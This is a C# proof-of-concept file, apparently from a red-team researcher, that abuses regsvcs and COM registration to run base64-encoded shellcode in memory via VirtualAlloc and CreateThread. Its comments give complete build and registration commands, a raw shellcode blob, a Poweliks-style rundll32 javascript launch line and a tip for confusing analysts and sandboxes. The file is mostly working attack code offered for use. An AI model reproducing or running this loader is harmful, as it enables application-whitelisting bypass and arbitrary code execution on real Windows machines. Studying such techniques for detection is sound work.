using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;


/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Create Your Strong Name Key -> key.snk
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte


C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /target:library /out:dllguest.dll /keyfile:key.snk dllguest.cs
 
//Requires Admin Rights to Register 
C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe dllguest.dll
[OR]
From Administrative x86 PowerShell
[reflection.Assembly]::LoadWithPartialName("system.enterpriseservices")
$helper = New-Object System.EnterpriseServices.RegistrationHelper
$a = 'JS'
$b = $null
$helper.InstallAssembly('dllguest.dll',( [ref] $a) ,( [ref] $b),  [System.EnterpriseServices.InstallationFlags]::CreateTargetApplication)

From Jscript raw Shellcode
var o = new ActiveXObject("JS");
var b64Data = '/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu+AdKgpoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==';	
o.ExecBytes(b64Data);

Poweliks Emulation
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=new%20ActiveXObject("JS");o.Exec();

Cleanup
C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe /U dllguest.dll

*/
[assembly: ApplicationActivation(ActivationOption.Server)]
[assembly: ApplicationAccessControl(false)]
namespace dllguest
{
    [ComVisible(true)]
    [Guid("31D2B969-ACDC-FACE-9D8E-C0FFEEA5ACDC")]
    [ClassInterface(ClassInterfaceType.AutoDispatch)]	
    [ProgId("JS")]    
    public class Bypass : ServicedComponent
    {
        public Bypass() {  } 
		
	public void ExecBytes(string a)
	{
		Shellcode.ExecBytes(a);
	}
		
    }

    public class Program
    {

        static void Main(string[] args)
        {
            Console.WriteLine("Hello, World!");
			//Add any additional functionality to distract/confuse analysts and sandbox execution.
			
        }
    }

    public class Shellcode
    {
        
		
		public static void ExecBytes(string b64)
        {
            byte[] shellcode = Convert.FromBase64String(b64);
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );


    }

}
